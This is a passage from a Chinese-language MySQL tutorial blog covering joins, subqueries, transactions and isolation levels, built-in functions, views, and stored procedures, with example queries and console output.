<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empno,ename,job,e.deptno,dname <span class="keyword">FROM</span> emp e <span class="keyword">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> dept d <span class="keyword">ON</span> e.deptno=d.deptno;</span><br></pre></td></tr></table></figure>

<h3 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 求7369员工编号、姓名、经理编号和经理姓名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> e1.empno,e1.ename,e1.mgr,e2.ename <span class="keyword">FROM</span> emp e1,emp e2 <span class="keyword">WHERE</span> e1.mgr=e2.empno <span class="keyword">AND</span> e1.empno=<span class="number">7369</span>;</span><br></pre></td></tr></table></figure>

<h3 id="自然连接"><a href="#自然连接" class="headerlink" title="自然连接"></a>自然连接</h3><blockquote>
<p><strong>两个关系表中进行连接的必须是相同的属性列（名字相同），无须添加连接条件，并且在结果中消除重复的属性列。</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> *<span class="keyword">from</span> emp <span class="keyword">natural</span> <span class="keyword">join</span> dept; </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>denptno(连接)</th>
<th>deptname</th>
<th>deptssss</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>sss</td>
<td>44</td>
</tr>
<tr>
<td>2</td>
<td>sss11</td>
<td>4442</td>
</tr>
<tr>
<td>3</td>
<td>fs</td>
<td>2424</td>
</tr>
</tbody></table>
<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><ol>
<li>子查询结果为单行单列</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> deptno <span class="keyword">FROM</span> dept <span class="keyword">WHERE</span> dname=<span class="string">&#x27;SALES&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span>*<span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> deptno=<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 一步完成</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> deptno=(<span class="keyword">SELECT</span> deptno <span class="keyword">FROM</span> dept <span class="keyword">WHERE</span> dname=<span class="string">&#x27;SALES&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用俩表连接</span></span><br><span class="line"><span class="keyword">SELECT</span> emp.*<span class="keyword">FROM</span> emp <span class="keyword">INNER</span> <span class="keyword">JOIN</span> dept <span class="keyword">ON</span> emp.deptno=dept.deptno <span class="keyword">WHERE</span> dname=<span class="string">&#x27;SALES&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>子查询结果为单列多行</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询工资大于3000的员工，来自哪些部门的名字</span></span><br><span class="line"><span class="keyword">SELECT</span> deptno <span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> sal&gt;<span class="number">2000</span>;<span class="comment">---&gt;10,20,30</span></span><br><span class="line"><span class="keyword">SELECT</span> dname <span class="keyword">FROM</span> dept <span class="keyword">WHERE</span> deptno <span class="keyword">IN</span> (<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> dname <span class="keyword">FROM</span> dept <span class="keyword">WHERE</span> deptno <span class="keyword">IN</span>(<span class="keyword">SELECT</span> deptno <span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> sal&gt;<span class="number">2000</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>子查询结果为多行多列</li>
</ol>
<blockquote>
<p><strong>找出虚拟表，并当成俩表连接查询</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 查询字段 <span class="keyword">from</span>(子查询) 表别名 <span class="keyword">where</span> 条件<span class="number">.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询出2011年以后入职的员工</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> hiredate&gt;=<span class="string">&#x27;1982-1-1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> e.*,d.dname <span class="keyword">FROM</span> dept d,(<span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> hiredate&gt;=<span class="string">&#x27;1982-1-1&#x27;</span>) e <span class="keyword">WHERE</span> d.deptno=e.deptno;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 有俩个直接下属的员工信息</span></span><br><span class="line"><span class="keyword">SELECT</span> mgr,<span class="keyword">COUNT</span>(*) <span class="keyword">FROM</span> emp <span class="keyword">GROUP</span> <span class="keyword">BY</span> mgr;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 有俩个下属以上</span></span><br><span class="line"><span class="keyword">SELECT</span> mgr <span class="keyword">FROM</span> emp <span class="keyword">GROUP</span> <span class="keyword">BY</span> mgr <span class="keyword">HAVING</span> <span class="keyword">COUNT</span>(*)&gt;<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询以上俩个编号的员工信息</span></span><br><span class="line"><span class="keyword">SELECT</span> *<span class="keyword">FROM</span> emp <span class="keyword">WHERE</span> empno <span class="keyword">IN</span>(<span class="keyword">SELECT</span> mgr <span class="keyword">FROM</span> emp <span class="keyword">GROUP</span> <span class="keyword">BY</span> mgr <span class="keyword">HAVING</span> <span class="keyword">COUNT</span>(*)&gt;<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><blockquote>
<p>事务是一组SQL语句组成的逻辑处理单元，事务执行是一个整体，<strong>所有SQL语句都必须执行成功</strong></p>
</blockquote>
<h2 id="事务操作"><a href="#事务操作" class="headerlink" title="事务操作"></a>事务操作</h2><p><strong>select @@autocommit;  自动提交 1，</strong></p>
<p><strong>set @@autocommit =0;</strong></p>
<h3 id="自动提交"><a href="#自动提交" class="headerlink" title="自动提交"></a>自动提交</h3><p>每一条<strong>insert、update、delete</strong>都会默认构成一条事务，会自动提交，永久改变数据库</p>
<h3 id="手动提交"><a href="#手动提交" class="headerlink" title="手动提交"></a>手动提交</h3><p>开启事务 start transaction</p>
<p>提交事务 commit</p>
<p>回滚事务 rollback：回退到开启事务时的状态</p>
<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p><strong>执行成功</strong>：开启事务–&gt;执行多条SQL语句–&gt;成功提交事务</p>
<p><strong>执行失败：</strong>开启事务–&gt;执行多条SQL语句–&gt;事务回滚，<strong>回滚事务即是结束</strong></p>
<p><strong>回滚：</strong>设置回滚点：<strong>savepoint 名字</strong></p>
<p>​            回到回滚点：<strong>rollback to 名字；</strong></p>
<h2 id="事务原理"><a href="#事务原理" class="headerlink" title="事务原理"></a>事务原理</h2><p>事务开启后，所有的操作会保存到事务日志中，事务日志只有得到commit命令才会同步到数据库中，</p>
<p>其他任何情况都会清空事务日志（rollback，断开连接）</p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><table>
<thead>
<tr>
<th>ACID属性</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>原子性（Atomicity）</td>
<td>事务是一个原子操作单元，其对数据的修改，要么全部成功，要么全部失败。</td>
</tr>
<tr>
<td>一致性（Consistent）</td>
<td>在事务开始和完成时，数据都必须保持一致状态。</td>
</tr>
<tr>
<td>隔离性（Isolation）</td>
<td>数据库系统提供一定的隔离机制，保证事务在不受外部并发操作影响的 “独立” 环境下运行。</td>
</tr>
<tr>
<td>持久性（Durable）</td>
<td>事务完成之后，对于数据的修改是永久的。</td>
</tr>
</tbody></table>
<h3 id="并发事务问题"><a href="#并发事务问题" class="headerlink" title="并发事务问题"></a>并发事务问题</h3><table>
<thead>
<tr>
<th>问题</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>丢失更新（Lost Update）</td>
<td>当两个或多个事务选择同一行，最初的事务修改的值，会被后面的事务修改的值覆盖。</td>
</tr>
<tr>
<td>脏读（Dirty Reads）</td>
<td>当一个事务正在访问数据，并且对数据进行了修改，而这种修改还没有提交到数据库中，这时，另外一个事务也访问这个数据，然后使用了这个数据。</td>
</tr>
<tr>
<td>不可重复读（Non-Repeatable Reads）</td>
<td>一个事务在读取某些数据后的某个时间，再次读取以前读过的数据，却发现和以前读出的数据不一致。数据内容不一致，update引起的</td>
</tr>
<tr>
<td>幻读（Phantom Reads）</td>
<td>一个事务按照相同的查询条件重新读取以前查询过的数据，却发现其他事务插入了满足其查询条件的新数据。数据的数量不一致，是insert/delete引起的</td>
</tr>
</tbody></table>
<h3 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h3><blockquote>
<p><strong>隔离级别越高，性能越差，安全性越高，效率越低</strong></p>
</blockquote>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>丢失更新</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>Read uncommitted</td>
<td>×</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>Read committed(Oracke和SQL Server)</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>Repeatable read（MySql默认）</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>Serializable串行化</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<p><strong>设置隔离级别</strong> ：<strong>set global transaction isolation level —;</strong></p>
<p><strong>查看隔离级别</strong>：<strong>select @@tx_isolation;</strong> </p>
<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp <span class="keyword">where</span> <span class="keyword">name</span> regexp <span class="string">&#x27;^T&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp <span class="keyword">where</span> <span class="keyword">name</span> regexp <span class="string">&#x27;2$&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> emp <span class="keyword">where</span> <span class="keyword">name</span> regexp <span class="string">&#x27;[uvw]&#x27;</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>在字符串开始处进行匹配</td>
</tr>
<tr>
<td>$</td>
<td>在字符串末尾处进行匹配</td>
</tr>
<tr>
<td>.</td>
<td>匹配任意单个字符, 包括换行符</td>
</tr>
<tr>
<td>[…]</td>
<td>匹配出括号内的任意字符</td>
</tr>
<tr>
<td>[^…]</td>
<td>匹配不出括号内的任意字符</td>
</tr>
<tr>
<td>a*</td>
<td>匹配零个或者多个a(包括空串)</td>
</tr>
<tr>
<td>a+</td>
<td>匹配一个或者多个a(不包括空串)</td>
</tr>
<tr>
<td>a?</td>
<td>匹配零个或者一个a</td>
</tr>
<tr>
<td>a1|a2</td>
<td>匹配a1或a2</td>
</tr>
<tr>
<td>a(m)</td>
<td>匹配m个a</td>
</tr>
<tr>
<td>a(m,)</td>
<td>至少匹配m个a</td>
</tr>
<tr>
<td>a(m,n)</td>
<td>匹配m个a 到 n个a</td>
</tr>
<tr>
<td>a(,n)</td>
<td>匹配0到n个a</td>
</tr>
<tr>
<td>(…)</td>
<td>将模式元素组成单一元素</td>
</tr>
</tbody></table>
<h2 id="常用函数-1"><a href="#常用函数-1" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="数字函数"><a href="#数字函数" class="headerlink" title="数字函数"></a>数字函数</h3><table>
<thead>
<tr>
<th>函数名称</th>
<th>作 用</th>
</tr>
</thead>
<tbody><tr>
<td>abs</td>
<td>求绝对值</td>
</tr>
<tr>
<td>sqrt</td>
<td>求二次方根</td>
</tr>
<tr>
<td>mod</td>
<td>求余数</td>
</tr>
<tr>
<td>ceil 和 CEILING</td>
<td>两个函数功能相同，都是返回不小于参数的最小整数，即向上取整</td>
</tr>
<tr>
<td>floor</td>
<td>向下取整，返回值转化为一个BIGINT</td>
</tr>
<tr>
<td>RAND</td>
<td>生成一个0~1之间的随机数，传入整数参数是，用来产生重复序列</td>
</tr>
<tr>
<td>ROUND</td>
<td>对所传参数进行四舍五入</td>
</tr>
<tr>
<td>SIGN</td>
<td>返回参数的符号</td>
</tr>
<tr>
<td>POW 和 POWER</td>
<td>两个函数的功能相同，都是所传参数的次方的结果值</td>
</tr>
<tr>
<td>sin</td>
<td>求正弦值</td>
</tr>
<tr>
<td>asin</td>
<td>求反正弦值，与函数 SIN 互为反函数</td>
</tr>
<tr>
<td>COS</td>
<td>求余弦值</td>
</tr>
<tr>
<td>ACOS</td>
<td>求反余弦值，与函数 COS 互为反函数</td>
</tr>
<tr>
<td>TAN</td>
<td>求正切值</td>
</tr>
<tr>
<td>ATAN</td>
<td>求反正切值，与函数 TAN 互为反函数</td>
</tr>
<tr>
<td>COT</td>
<td>求余切值</td>
</tr>
</tbody></table>
<h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><table>
<thead>
<tr>
<th>函数名称</th>
<th>作 用</th>
</tr>
</thead>
<tbody><tr>
<td>LENGTH</td>
<td>计算字符串长度函数，返回字符串的字节长度</td>
</tr>
<tr>
<td>CONCAT</td>
<td>合并字符串函数，返回结果为连接参数产生的字符串，参数可以使一个或多个</td>
</tr>
<tr>
<td>INSERT</td>
<td>替换字符串函数</td>
</tr>
<tr>
<td>LOWER</td>
<td>将字符串中的字母转换为小写</td>
</tr>
<tr>
<td>UPPER</td>
<td>将字符串中的字母转换为大写</td>
</tr>
<tr>
<td>LEFT</td>
<td>从左侧字截取符串，返回字符串左边的若干个字符  left(‘javass’,4)</td>
</tr>
<tr>
<td>RIGHT</td>
<td>从右侧字截取符串，返回字符串右边的若干个字符</td>
</tr>
<tr>
<td>TRIM</td>
<td>删除字符串左右两侧的空格</td>
</tr>
<tr>
<td>REPLACE</td>
<td>字符串替换函数，返回替换后的新字符串</td>
</tr>
<tr>
<td>SUBSTRING</td>
<td>索引从1 开始，截取字符串，返回从指定位置开始的指定长度的字符换  substring(‘javahello’,1,4)</td>
</tr>
<tr>
<td>REVERSE</td>
<td>字符串反转（逆序）函数，返回与原始字符串顺序相反的字符串</td>
</tr>
</tbody></table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- concat(a,b,c)  合并</span></span><br><span class="line"><span class="keyword">select</span> empno,ename,<span class="keyword">concat</span>(empno,ename) <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- length()</span></span><br><span class="line"><span class="keyword">select</span> *<span class="keyword">from</span> emp <span class="keyword">where</span> <span class="keyword">length</span>(ename)=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- strcmp(),相同返回0，大于返回1，小于返回</span></span><br></pre></td></tr></table></figure>

<h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><table>
<thead>
<tr>
<th>函数名称</th>
<th>作 用</th>
</tr>
</thead>
<tbody><tr>
<td>CURDATE 和 CURRENT_DATE</td>
<td>两个函数作用相同，返回当前系统的日期值</td>
</tr>
<tr>
<td>CURTIME 和 CURRENT_TIME</td>
<td>两个函数作用相同，返回当前系统的时间值</td>
</tr>
<tr>
<td>NOW 和  SYSDATE</td>
<td>两个函数作用相同，返回当前系统的日期和时间值</td>
</tr>
<tr>
<td>MONTH</td>
<td>获取指定日期中的月份</td>
</tr>
<tr>
<td>MONTHNAME</td>
<td>获取指定日期中的月份英文名称</td>
</tr>
<tr>
<td>DAYNAME</td>
<td>获取指定曰期对应的星期几的英文名称</td>
</tr>
<tr>
<td>DAYOFWEEK</td>
<td>获取指定日期对应的一周的索引位置值</td>
</tr>
<tr>
<td>WEEK</td>
<td>获取指定日期是一年中的第几周，返回值的范围是否为 0〜52 或 1〜53</td>
</tr>
<tr>
<td>DAYOFYEAR</td>
<td>获取指定曰期是一年中的第几天，返回值范围是1~366</td>
</tr>
<tr>
<td>DAYOFMONTH</td>
<td>获取指定日期是一个月中是第几天，返回值范围是1~31</td>
</tr>
<tr>
<td>YEAR</td>
<td>获取年份，返回值范围是 1970〜2069</td>
</tr>
<tr>
<td>TIME_TO_SEC</td>
<td>将时间参数转换为秒数</td>
</tr>
<tr>
<td>SEC_TO_TIME</td>
<td>将秒数转换为时间，与TIME_TO_SEC 互为反函数</td>
</tr>
<tr>
<td>DATE_ADD 和 ADDDATE</td>
<td>两个函数功能相同，都是向日期添加指定的时间间隔</td>
</tr>
<tr>
<td>DATE_SUB 和 SUBDATE</td>
<td>两个函数功能相同，都是向日期减去指定的时间间隔</td>
</tr>
<tr>
<td>ADDTIME</td>
<td>时间加法运算，在原始时间上添加指定的时间</td>
</tr>
<tr>
<td>SUBTIME</td>
<td>时间减法运算，在原始时间上减去指定的时间</td>
</tr>
<tr>
<td>DATEDIFF</td>
<td>获取两个日期之间间隔，返回参数 1 减去参数 2 的值</td>
</tr>
<tr>
<td>DATE_FORMAT</td>
<td>格式化指定的日期，根据参数返回指定格式的值</td>
</tr>
<tr>
<td>WEEKDAY</td>
<td>获取指定日期在一周内的对应的工作日索引</td>
</tr>
</tbody></table>
<p>current_date() 、current_time() 、<strong>now</strong>()</p>
<p><strong>year</strong>(now())、<strong>day</strong>(now())、<strong>hour</strong>(now())</p>
<p>day of week(now())、day of week(‘2020-8-22’)</p>
<p><strong>减法:</strong> <strong>datediff</strong> (‘2012-2-20’,’2012-2-22’)</p>
<p><strong>加法:</strong>  <strong>date_add</strong> (‘2020-2-20’, interval 1 date)</p>
<h3 id="聚合函数-1"><a href="#聚合函数-1" class="headerlink" title="聚合函数"></a>聚合函数</h3><table>
<thead>
<tr>
<th>函数名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>MAX</td>
<td>查询指定列的最大值</td>
</tr>
<tr>
<td>MIN</td>
<td>查询指定列的最小值</td>
</tr>
<tr>
<td>COUNT</td>
<td>统计查询结果的行数</td>
</tr>
<tr>
<td>SUM</td>
<td>求和，返回指定列的总和</td>
</tr>
<tr>
<td>AVG</td>
<td>求平均值，返回指定列数据的平均值</td>
</tr>
</tbody></table>
<h1 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h1><blockquote>
<p>视图是一条select语句执行返回的结果，是一种虚拟存在的表。</p>
</blockquote>
<blockquote>
<ul>
<li>简单：使用视图的用户完全不需要关心后面对应的表的结构、关联条件和筛选条件，对用户来说已经是<strong>过滤好的复合条件的结果集。</strong></li>
<li>安全：<strong>使用视图的用户只能访问他们被允许查询的结果集</strong>，数据库对表的<strong>权限管理</strong>并不能限制到某个行某个列，但是通过视图就可以简单的实现。</li>
<li>数据独立：一旦视图的结构确定了，可以<strong>屏蔽表结构变化对用户的影响</strong>，源表增加列对视图没有影响；源表修改列名，则可以通过修改视图来解决，不会造成对访问者的影响。</li>
</ul>
</blockquote>
<h2 id="创建视图"><a href="#创建视图" class="headerlink" title="创建视图"></a>创建视图</h2><blockquote>
<p>create 视图名 as (select语句)</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> v_general </span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> empno,ename,job,mgr,deptno <span class="keyword">FROM</span> emp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> *<span class="keyword">from</span> v_general</span><br></pre></td></tr></table></figure>

<h2 id="更新视图"><a href="#更新视图" class="headerlink" title="更新视图"></a>更新视图</h2><blockquote>
<p><strong>更新视图的同时也会更新原有表！！！</strong></p>
<p>update 视图名 set 字段名=‘’  where ..</p>
</blockquote>
<h2 id="修改视图"><a href="#修改视图" class="headerlink" title="修改视图"></a>修改视图</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">view</span> 视图名 <span class="keyword">as</span> (<span class="keyword">select</span>语句);</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">view</span> 视图名 </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除视图</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> 视图名</span><br></pre></td></tr></table></figure>

<h2 id="查看视图"><a href="#查看视图" class="headerlink" title="查看视图"></a>查看视图</h2><blockquote>
<p>show tables;</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201018203633852.png" alt="image-20201018203633852" style="zoom:80%;" />



<h1 id="存储过程与函数"><a href="#存储过程与函数" class="headerlink" title="存储过程与函数"></a>存储过程与函数</h1><p>存储过程和函数是事先经过编译并存储在数据库中的一段 SQL 语句的集合</p>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>调用存储过程和函数可以<strong>减少数据在数据库和应用服务器之间的传输</strong>，对于提高数据处理的效率是有好处的。</p>
<p>存储过程和函数的区别在于函数必须有返回值，而存储过程没有。</p>
<blockquote>
<ul>
<li><p>函数 ： 是一个有返回值的过程 ；</p>
</li>
<li><p>过程 ： 是一个没有返回值的函数 ；</p>
</li>
</ul>
</blockquote>
<h2 id="存储过程procedure"><a href="#存储过程procedure" class="headerlink" title="存储过程procedure"></a>存储过程procedure</h2><h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><h4 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 声明SQL语句的分隔符</span></span><br><span class="line">delimiter $</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> pro_test1()</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">select</span> <span class="string">&#x27;Hello Mysql&#x27;</span> ;</span><br><span class="line"><span class="keyword">end</span>$</span><br><span class="line"></span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建存储过程函数</span></span><br><span class="line">mysql&gt; create procedure pro_test1() </span><br><span class="line">    -&gt; begin</span><br><span class="line">    -&gt; select &#x27;hello&#x27;;</span><br><span class="line">    -&gt; end</span><br><span class="line">    -&gt; #</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 显示存储过程的状态信息</span></span><br><span class="line">mysql&gt; show procedure status\G#</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                  Db: demo_01</span><br><span class="line">                Name: pro_test1</span><br><span class="line">                Type: PROCEDURE</span><br><span class="line">             Definer: root@localhost</span><br><span class="line">            Modified: 2020-10-18 05:54:27</span><br><span class="line">             Created: 2020-10-18 05:54:27</span><br><span class="line">       Security_type: DEFINER</span><br><span class="line">             <span class="keyword">Comment</span>: </span><br><span class="line">character_set_client: utf8</span><br><span class="line">collation_connection: utf8_general_ci</span><br><span class="line">  <span class="keyword">Database</span> <span class="keyword">Collation</span>: utf8mb4_general_ci</span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 定义分隔符</span></span><br><span class="line">mysql&gt; delimiter ;</span><br></pre></td></tr></table></figure>

<h4 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">call</span> procedure_name() </span><br></pre></td></tr></table></figure>

<h4 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询db_name数据库中的所有的存储过程</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> mysql.proc <span class="keyword">where</span> db=<span class="string">&#x27;db_name&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询存储过程的状态信息</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">procedure</span> <span class="keyword">status</span>\G;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询某个存储过程的定义</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">procedure</span> test.pro_test1 \G;</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><blockquote>
<p>drop procedure 函数名(无括号);</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> pro_test1();</span><br></pre></td></tr></table></figure>

<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><blockquote>
<p>存储过程是可以编程的，意味着可以使用变量，表达式，控制结构 ， 来完成比较复杂的功能。</p>
<p>表修改，调用时查询时也会改变。</p>
</blockquote>
<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><blockquote>
<p>通过 declare可以定义一个局部变量，该变量的作用范围只能在 BEGIN…END 块中</p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; create procedure pro_test1()</span><br><span class="line">    -&gt; begin</span><br><span class="line">    -&gt; declare num int default 10;</span><br><span class="line">    -&gt; select num=num+10;</span><br><span class="line">    -&gt; end@</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; call pro_test1()@</span><br></pre></td></tr></table></figure>

<blockquote>
<p>变量赋值</p>
<p>直接赋值使用 <strong>set</strong>，可以赋常量或者赋表达式</p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; create procedure pro_test1()</span><br><span class="line">    -&gt; begin</span><br><span class="line">    -&gt; declare num int default 10;</span><br><span class="line">    -&gt; set num= num +101;</span><br><span class="line">    -&gt; select num;</span><br><span class="line">    -&gt; end@</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>select…into…</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; create procedure pro_test2()</span><br><span class="line">    -&gt; begin </span><br><span class="line">    -&gt; declare num int;</span><br><span class="line">    -&gt; select count(*) into num from city;</span><br><span class="line">    -&gt; select concat(&#x27;city表中的记录数是:&#x27;,num);</span><br><span class="line">    -&gt; end</span><br><span class="line">    -&gt; @</span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; call pro_test2()@</span><br><span class="line">+<span class="comment">------------------------------------------+</span></span><br><span class="line">| concat(&#x27;city表中的记录数是:&#x27;,num)        |</span><br><span class="line">+<span class="comment">------------------------------------------+</span></span><br><span class="line">| city表中的记录数是:4                     |</span><br><span class="line">+<span class="comment">------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h4 id="if判断"><a href="#if判断" class="headerlink" title="if判断"></a>if判断</h4><blockquote>
<p><strong>if</strong>..then..elseif..then..else.<strong>.end if;</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; create procedure pro_test4()</span><br><span class="line">    -&gt; begin</span><br><span class="line">    -&gt; declare height int default 175;</span><br><span class="line">    -&gt; declare description varchar(59) default &#x27;&#x27;;</span><br><span class="line">    -&gt; if height&gt;= 180 then</span><br><span class="line">    -&gt; set description =&#x27;身材高挑&#x27;;</span><br><span class="line">    -&gt; elseif height&gt;=170 and height&lt;180 then</span><br><span class="line">    -&gt; set description =&#x27;标准身材&#x27;;</span><br><span class="line">    -&gt; else </span><br><span class="line">    -&gt; set description=&#x27;一般身材&#x27;;</span><br><span class="line">    -&gt; end if;</span><br><span class="line">    -&gt; select concat(&#x27;身高&#x27;,height,&#x27;对应的身材类型为&#x27;,description);</span><br><span class="line">    -&gt; end@</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; call pro_test4()@</span><br><span class="line">+<span class="comment">----------------------------------------------------------------+</span></span><br><span class="line">| concat(&#x27;身高&#x27;,height,&#x27;对应的身材类型为&#x27;,description)           |</span><br><span class="line">+<span class="comment">----------------------------------------------------------------+</span></span><br><span class="line">| 身高175对应的身材类型为标准身材                                |</span><br><span class="line">+<span class="comment">----------------------------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="带参存储过程"><a href="#带参存储过程" class="headerlink" title="带参存储过程"></a>带参存储过程</h4><blockquote>
<p>语法  create procedure pro_test(in 参数名 类型)</p>
<ul>
